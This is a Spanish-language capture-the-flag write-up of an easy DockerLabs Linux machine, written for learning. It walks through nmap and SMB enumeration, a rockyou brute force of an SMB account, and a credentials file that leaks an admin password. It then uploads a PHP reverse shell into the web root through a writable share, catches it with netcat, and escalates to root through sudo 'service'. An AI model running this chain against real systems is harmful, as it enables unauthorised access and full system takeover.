Propiedades:
- OS: Linux
- Plataforma: DockerLabs
- Nivel: Easy
- Tags: #smb #brute-force #reverse-shell #sudo-abuse

![](assets/Pasted%20image%2020251110203526.png)

## Reconocimiento

Comienzo tirando un ping para comprobar la conectividad.

```bash
> ping -c 1 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=3.27 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 3.274/3.274/3.274/0.000 ms
```

Ahora tiro un escaneo con nmap para ver que puertos tenemos abiertos.

```bash
> nmap -p- -sS --open --min-rate 5000 -Pn -n -vvv 172.17.0.2
-------------------------------------------------------------
PORT    STATE SERVICE      REASON
22/tcp  open  ssh          syn-ack ttl 64
80/tcp  open  http         syn-ack ttl 64
139/tcp open  netbios-ssn  syn-ack ttl 64
445/tcp open  microsoft-ds syn-ack ttl 64
MAC Address: 32:99:3C:A5:58:17 (Unknown)
```

- Puertos 22, 80, 139 y 445 abiertos.

Sobre los puertos abiertos realizo un segundo escaneo más profundo para detectar servicios, versiones y correr un conjunto de scripts de reconocimiento.

```bash
> nmap -p 22,80,139,445 -sCV --min-rate 5000 -Pn -n -vvv -sS 172.17.0.2 -oN target.txt
---------------------------------------------------------------------------------------
PORT    STATE SERVICE     REASON         VERSION
22/tcp  open  ssh         syn-ack ttl 64 OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 43:a1:09:2d:be:05:58:1b:01:20:d7:d0:d8:0d:7b:a6 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGrGDto+yIluWWc28CO9WLop39MgTQepDrYpDWvwqPgqpC2Ea8ZtGQCObWL21GlJITWAdFSZS0HaWuo1Wl9nZ84=
|   256 cd:98:0b:8a:0b:f9:f5:43:e4:44:5d:33:2f:08:2e:ce (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICk8CRYpvJnqRBsGb/f/ZxXJoTikc4EQdeCBsvENuMwD
80/tcp  open  http        syn-ack ttl 64 Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Login
139/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 4.6.2
445/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 4.6.2
MAC Address: 32:99:3C:A5:58:17 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- Puerto 22 SSH OpenSSH 9.6p1 Ubuntu 3ubuntu13.5
- Puerto 80 HTTP Apache httpd 2.4.58 (Ubuntu)
- Puertos 139 y 445 SMB Samba smbd 4.6.2

## Enumeración

### Puerto 80 HTTP

La página principal muestra un formulario de login simple.

![](assets/Pasted%20image%2020251110204129.png)

**Fuzzing de Directorios.**

Utilizo `gobuster` para descubrir recursos en el servidor web.

```bash
> gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -u http://172.17.0.2/ -x html,php,py,js,txt,json
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/info.php             (Status: 200) [Size: 72710]
/index.php            (Status: 200) [Size: 3543]
/server-status        (Status: 403) [Size: 275]
/productos.php        (Status: 200) [Size: 5229]
/index.php            (Status: 200) [Size: 3543]
```

**info.php**

El archivo `info.php` muestra la configuración de PHP. En la sección `disable_functions` no hay ninguna función deshabilitada, lo cual es útil para la ejecución de comandos.

![](assets/Pasted%20image%2020251110204600.png)

**productos.php**

Esta página parece ser la principal de la aplicación, probablemente a donde redirige después del login.

![](assets/Pasted%20image%2020251110204745.png)

### Puertos 139 y 445 SMB

Enumero los recursos compartidos disponibles con `smbmap`.

```bash
> smbmap -H 172.17.0.2
[+] IP: 172.17.0.2:445	Name: pressenter.hl                                     
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	myshare                                           	READ ONLY	Carpeta compartida sin restricciones
	backup24                                          	NO ACCESS	Privado
	home                                              	NO ACCESS	Produccion
	IPC$                                              	NO ACCESS	IPC Service (EseEmeB Samba Server)
```

- Tengo acceso de lectura al recurso `myshare`

Me conecto al recurso compartido `myshare`.

```bash
> smbclient //172.17.0.2/myshare -N
> smb: \> ls
  .                                   D        0  Sun Oct  6 16:26:40 2024
  ..                                  D        0  Sun Oct  6 16:26:40 2024
  access.txt                          N      956  Sun Oct  6 00:46:26 2024
```

Descargo y examino el archivo `access.txt`.

```bash
smb: \> get access.txt
smb: \> exit
> cat access.txt
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InNhdHJpYW5pN0Blc2VlbWViLmRsIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3MjgxNjAzNzMsImV4cCI6MTcyODE2Mzk3MywiandrIjp7Imt0eSI6IlJTQSIsIm4iOiI2MzU4NTI5OTgwNzk4MDM4NzI2MjQyMzYxMjc2NTg2NjE3MzU1MzUyMTMxNjU0ODI2NDI1ODg4NDkzNTU1NDYxNTIyNTc1NTAwNjY0ODY2MDM4OTY4ODMwNTk4OTY0NjUxOTQ2NDEzMzU4OTI1MzU2OTM4MDQwMTE1MjQzMDg4MTg0NTg1MzQxMzY5NTQyNTgxNTQwOTc3MjMzMjU0MTQxNzQ5NzczNDQyODkwNjc3ODY2MjI3NzUyMzEzMzg2OTk1NzA1ODAxNzM0NjA2NDE1NjkyNTM5MjAyNzc5OTczMjczODgyNTc1NTUwMTIwMDc4NjUzNDc0MTU1MjMyMjkwMDAxNjM4NTIwMTExNTUyNjE1NDkwMjQyOTYyMDA4MjYxNDI4NzA0MjAxNjcwOTg0NDUyMjY1NzcwNyIsImUiOjY1NTM3fX0.bQhS5qLCv5bf3sy-oHS7ZGcqqjk3LqyJ5bv-Jw6DIIoSIkmBtiocq07F7joOeKRxS3roWdHEuZUMeHQfWTHwRH7pHqCIBVJObdvHI8WR_Gac_MPYvwd6aSAoNExSlZft1-hXJUWbUIZ683JqEg06VYIap0Durih2rUio4Bdzv68JIo_3M8JFMV6kQTHnM3CElKy-UdorMbTxMQdUGKLk_4C7_FLwrGQse1f_iGO2MTzxvGtebQhERv-bluUYGU3Dq7aJCNU_hBL68EHDUs0mNSPF-f_FRtdENILwF4U14PSJiZBS3e5634i9HTmzRhvCGAqY00isCJoEXC1smrEZpg
```

- El contenido parece ser un token JWT, pero no es útil para la explotación.

**Enumeración de Usuarios SMB.**

Utilizo `enum4linux` para enumerar usuarios del servicio SMB.

```bash
> enum4linux -a 172.17.0.2
--------------------------------------------------------------------------------------------------------------
> [+] Enumerating users using SID S-1-5-21-3519099135-2650601337-1395019858 and logon username '', password ''

S-1-5-21-3519099135-2650601337-1395019858-501 SAMBASERVER\nobody (Local User)
S-1-5-21-3519099135-2650601337-1395019858-513 SAMBASERVER\None (Domain Group)
S-1-5-21-3519099135-2650601337-1395019858-1000 SAMBASERVER\usuario1 (Local User)
S-1-5-21-3519099135-2650601337-1395019858-1001 SAMBASERVER\usuario2 (Local User)
S-1-5-21-3519099135-2650601337-1395019858-1002 SAMBASERVER\usuario3 (Local User)
S-1-5-21-3519099135-2650601337-1395019858-1003 SAMBASERVER\satriani7 (Local User)
S-1-5-21-3519099135-2650601337-1395019858-1004 SAMBASERVER\administrador (Local User)
```

- Usuarios de interés: `satriani7` y `administrador`

## Explotación

### Brute Force SMB

Realizo un ataque de fuerza bruta contra el usuario `satriani7` utilizando `netexec`.

```bash
> nxc smb 172.17.0.2 -u satriani7 -p /usr/share/wordlists/rockyou.txt
---------------------------------------------------------------------------
SMB         172.17.0.2      445    SAMBASERVER      [+] SAMBASERVER\satriani7:50cent
```

- Credenciales encontradas: `satriani7:50cent`

Enumero los recursos SMB a los que tiene acceso `satriani7`.

```bash
> smbmap -H 172.17.0.2 -u satriani7 -p 50cent
[+] IP: 172.17.0.2:445	Name: pressenter.hl                                     
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	myshare                                           	READ ONLY	Carpeta compartida sin restricciones
	backup24                                          	READ ONLY	Privado
	home                                              	NO ACCESS	Produccion
	IPC$                                              	NO ACCESS	IPC Service (EseEmeB Samba Server)
```

- Ahora tengo acceso de lectura al recurso `backup24`

Me conecto al recurso `backup24` y exploro su contenido.

```bash
> smbclient //172.17.0.2/backup24 -U satriani7%50cent
```

Dentro del recurso encuentro múltiples directorios y archivos. Después de explorar, encuentro dos archivos interesantes en `/Documents/Personal`:

- `credentials.txt`
- `notes.txt`

```bash
> smb: \Documents\Personal\> get credentials.txt
> smb: \Documents\Personal\> get notes.txt
```

El archivo `credentials.txt` contiene varias credenciales, incluyendo las del administrador.

```bash
> cat credentials.txt 
# Archivo de credenciales

Este documento expone credenciales de usuarios, incluyendo la del usuario administrador.
7. Usuario: administrador
    - Contraseña: Adm1nP4ss2024 
```

- Credenciales: `administrador:Adm1nP4ss2024`

Enumero los recursos a los que tiene acceso el usuario `administrador`.

```bash
> smbmap -H 172.17.0.2 -u administrador -p Adm1nP4ss2024
[+] IP: 172.17.0.2:445	Name: pressenter.hl                                     
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	myshare                                           	READ ONLY	Carpeta compartida sin restricciones
	backup24                                          	NO ACCESS	Privado
	home                                              	READ, WRITE	Produccion
	IPC$                                              	NO ACCESS	IPC Service (EseEmeB Samba Server)
```

- Tengo permisos de lectura y escritura en el recurso `home`

Me conecto al recurso `home`.

```bash
> smbclient //172.17.0.2/home -U administrador%Adm1nP4ss2024
```

Listo el contenido del recurso.

```bash
> smb: \> ls
  .                                   D        0  Mon Nov 10 21:30:21 2025
  ..                                  D        0  Mon Nov 10 21:30:21 2025
  info.php                            N       21  Sun Oct  6 01:32:50 2024
  back.png                            N   463383  Sun Oct  6 01:59:29 2024
  index.php                           N     3543  Sun Oct  6 14:28:45 2024
  productos.php                       N     5229  Sun Oct  6 03:21:48 2024
  styles.css                          N      263  Sun Oct  6 03:22:06 2024
```

Podemos ver que estos archivos son identicos a los que encontramos mediante **Fuzzing** por lo cual esto quiere decir que seguramente esta sea la carpeta raiz de la web.

### Reverse Shell

Descargo la reverse shell de [PentestMonkey](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php) y la subo al recurso `home` del SMB.

- Tecnicamente, si el recurso `home` es la raiz de la web, todo lo que suba a este recurso se tiene que ver reflejado en la web.

```bash
smb: \> put php-reverse-shell.php
putting file php-reverse-shell.php as \php-reverse-shell.php (2681.0 kb/s) (average 1340.6 kb/s)
```

Me pongo en escucha en mi máquina atacante.

```bash
> sudo nc -nlvp 443
listening on [any] 443 ...
```

Accedo a la reverse shell desde el navegador: `http://172.17.0.2/php-reverse-shell.php`

Recibo la conexión y obtengo acceso al sistema.

```bash
Connection received on 172.17.0.2 56350
Linux 0318689382b0 6.12.32-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.32-1parrot1 (2025-06-27) x86_64 x86_64 x86_64 GNU/Linux
 03:39:38 up  5:12,  0 user,  load average: 0.92, 1.14, 1.94
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

## Escalada de Privilegios

Enumero binarios que pueda ejecutar con privilegios elevados.

```bash
www-data@0318689382b0:/$ sudo -l

User www-data may run the following commands on 0318689382b0:
    (ALL) NOPASSWD: /usr/sbin/service
```

- Puedo ejecutar `service` como root sin contraseña.

Consulto [GTFOBins](https://gtfobins.github.io/gtfobins/service/) para encontrar formas de abusar de `service` con privilegios sudo.

```bash
www-data@0318689382b0:/$ sudo /usr/sbin/service ../../bin/sh              
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
```

![](assets/Pasted%20image%2020251110214639.png)

***PWNED***